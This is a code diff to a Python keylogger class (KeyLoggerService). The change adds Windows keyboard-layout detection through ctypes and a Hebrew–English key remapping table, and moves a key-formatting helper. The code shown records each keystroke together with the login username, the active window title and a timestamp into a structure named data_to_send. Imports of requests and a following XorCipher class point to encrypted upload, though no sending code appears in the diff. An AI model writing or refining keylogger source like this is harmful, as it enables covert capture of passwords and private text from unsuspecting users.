@@ -6,18 +6,56 @@ import requests
 import time
 from threading import Thread
 import os
-
+import ctypes
 
 class KeyLoggerService:
     def __init__(self):
         self.data_to_send = {}
+
+    def _get_keyboard_language(self):
+        """ מזהה את פריסת השפה של המקלדת (עברית / אנגלית) """
+        user32 = ctypes.WinDLL("user32", use_last_error=True)
+        hwnd = user32.GetForegroundWindow()
+        thread_id = user32.GetWindowThreadProcessId(hwnd, None)
+        klid = user32.GetKeyboardLayout(thread_id)
+        return klid & 0xFFFF
+
+    def _convert_key(self, key_name):
+        """ ממיר מקש לפי השפה הנוכחית של המקלדת """
+        lang = self._get_keyboard_language()
+
+        en_to_hebrew = {
+            "a": "ש", "b": "נ", "c": "ב", "d": "ג", "e": "ק", "f": "כ", "g": "ע", "h": "י", "i": "ן", "j": "ח",
+            "k": "ל", "l": "ך", "m": "צ", "n": "מ", "o": "ם", "p": "פ", "q": "/", "r": "ר", "s": "ד", "t": "א",
+            "u": "ו", "v": "ה", "w": "'", "x": "ס", "y": "ט", "z": "ז", ";": "ף", "'": ",", ",": "ת", ".": "ץ"
+        }
+
+        he_to_english = {v: k for k, v in en_to_hebrew.items()}  # יוצרים טבלת המרה הפוכה
+
+        if lang == 1037:  # עברית
+            return en_to_hebrew.get(key_name, key_name)
+        elif lang == 1033:  # אנגלית
+            return he_to_english.get(key_name, key_name)
+        return key_name  # אם השפה לא מזוהה, מחזירים את המקש כמו שהוא
+
+    def _format_key(self, key_name):
+        """ מוסיף פורמט למקשים מיוחדים """
+        if key_name == "enter":
+            return " \n "
+        elif key_name == "space":
+            return " "
+        elif len(key_name) > 1:  # אם זה לא תו בודד (למשל "shift", "ctrl")
+            return f" [{key_name}] "
+        return key_name
 
     def on_press(self, event):
         window = gw.getActiveWindow()
         window = window.title if window else "Unknown Window"
         timestamp = datetime.now().strftime("%d/%m/%y %H:%M")
         username = os.getlogin()
-        key = self._format_key(event.name)
+
+        key = self._convert_key(event.name)
+        key = self._format_key(key)
 
         if username not in self.data_to_send:
             self.data_to_send[username] = {}
@@ -29,15 +67,6 @@ class KeyLoggerService:
             self.data_to_send[username][window][timestamp] = ""
 
         self.data_to_send[username][window][timestamp] += key
-
-    def _format_key(self, key_name):
-        if key_name == "enter":
-            return " \n "
-        elif key_name == "space":
-            return " "
-        elif len(key_name) > 1:
-            return f" [{key_name}] "
-        return key_name
 
 
 class XorCipher:
